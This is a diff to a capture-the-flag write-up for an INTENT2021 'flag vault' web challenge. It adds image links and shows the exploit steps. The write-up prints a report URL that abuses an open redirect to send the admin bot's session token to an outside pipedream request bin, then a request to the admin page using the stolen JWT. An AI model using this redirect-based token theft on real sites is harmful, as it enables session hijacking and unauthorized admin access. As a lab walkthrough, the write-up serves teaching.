@@ -5,7 +5,9 @@
 
 ### 1. Inspecting
 We're taken into a small site:
-(image here - main page)
+
+![main_page](https://github.com/aviyae/CTFs/blob/master/INTENT2021/flag_vault/main_page.PNG)
+
 Its body looks like that:
 ```html
 <body>
@@ -61,12 +63,12 @@ Two interesting points there are:
 * The redirect mechanism
 
 Needless to say that we don't know the "correct" email and password:
-(image here - main page error)
+![main_page_error](https://github.com/aviyae/CTFs/blob/master/INTENT2021/flag_vault/main_page_error.PNG)
 
 ### 2. Report a Bug
 We can "report" a bug by sending a URL
 
-(image here - main page report bug)
+![report_bug](https://github.com/aviyae/CTFs/blob/master/INTENT2021/flag_vault/main_page_report_bug.PNG)
 
 We assume that  "someone" (probably the admin) will enter that link later to watch the given link.
 
@@ -124,7 +126,7 @@ Cool
 According to the above, we'll send this request first:
 http://flag-vault.chal.intentsummit.org/api/v1/report?url=http://flag-vault.chal.intentsummit.org/?redirect=@enqr0riu3ob4o6p.m.pipedream.net
 In response we get the token to the request bin!
-(image here - request bin token)
+![request_bin_token](https://github.com/aviyae/CTFs/blob/master/INTENT2021/flag_vault/requestbin_token.PNG)
 
 The expiration date of the token is 10 seconds, so in that time we should quickly send:
 http://flag-vault.chal.intentsummit.org/admin/?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6dHJ1ZSwiaWF0IjoxNjM2OTI1NTU0LCJleHAiOjE2MzY5MjU1NjR9.kkBa7w3fkp2kO06TcV-V1lYQFCrfNVBIbG5TFd8RS1I
